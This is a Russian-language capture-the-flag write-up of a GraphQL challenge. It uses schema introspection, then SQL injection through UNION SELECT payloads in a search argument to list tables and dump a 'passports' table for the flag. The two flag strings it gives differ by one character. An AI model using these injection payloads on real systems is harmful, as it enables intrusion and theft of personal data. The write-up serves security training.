# В этом задании мы предлагаем вам познакомиться с темой GraphQL, разобратесь в ней и получите конфиденциальную информацию через веб-приложение: http://18.195.176.132/. Для решения задания вам могут пригодиться следующие ресурсы: [graphql-voyager](https://apis.guru/graphql-voyager/) и [Хабр. Пентест приложений с GraphQL](https://habr.com/ru/company/dsec/blog/444708/)

*** Ответ: flag{50e1a7e81d9814943dc6664a289a565}***

Прочитав предложенную статью с habr.com, скачиваем IDE Insomnia для отправки GraphQL-запросов. Заходим на сайт, ищем пакет с названием qraphql, импортируем header`ы и первым делом получаем query-запросы с помощью команды, приведенной в посте:

```GraphQL
    query {
        __schema {
          queryType {
            fields {
              name
              args {
                name
              }
            }
          }
        }
      }
```

Замечаем, что у нас есть два запроса, у которых есть поля аргументов -- это "searchTenderbyCity" и "searchTenderbyNumber". Как видно по названию, первый "поиск" ждет на вход параметр типа string, а второй - int. Так как в посте описаны методы пентеста, думаю стоит попробовать поискать уязвимости. Dos точно не подойдет, регистрировать/добавлять пользователей тоже нельзя, а кавычку отправить можно: 

```GraphQL
    query{
        searchTenderbyCity(tenderCity:"Mos'cow")
        {
          idtender
        }
      }
```

И нам приходит ответ, в стиле "errors": [{"message": "ER_PARSE_ERROR: You have an error in your SQL syntax;...}]
Это говорит о том, что мы нашли SQL-injection

Следующей командой узнаем названия всех Sql-таблиц в этой БД (Предварительно подобрав количество колонок) 

```GraphQL
    query{
        searchTenderbyCity(tenderCity:"'union select TABLE_NAME,2,3,4,5,6 from information_schema.tables#")
        {
          idtender
        }
      }
 ```
 
В наш взор попадают интересные таблицы: ...{"idtender": "authors"},{"idtender": "passports"},{"idtender": "tender"}...
Так как "authors" и "tender" мы можем получить даже с помощью запроса вида query, то passports мы видим впервые. Посмотрим, какие колонки содержит эта таблица:

```GraphQL
    query{
        searchTenderbyCity(tenderCity:"'union SELECT COLUMN_NAME,2,3,4,5,6 FROM information_schema.COLUMNS where TABLE_NAME = 'passports'#")
        {
          idtender
        }
      }
```

Согласно ответу сервера, их всего 4: idpassports, first_name, second_name и serial_number. Посмотрим их содержимое

```GraphQL
    query{
        searchTenderbyCity(tenderCity:"'union SELECT first_name,2,3,serial_number,idpassports,second_name FROM passports #")
        {
          idtender
          city
          description
          status
        }
      }
```

Ответ сервера выглядит вот так:

```GraphQL
    {
      "data": {
        "searchTenderbyCity": [
          {
            "idtender": "kek",
            "city": "pek",
            "description": "flag{50e1a7e81d9814943dc6664a289a3565}",
            "status": 1
          }
        ]
      }
    }
```
____
##### Score: 10/10
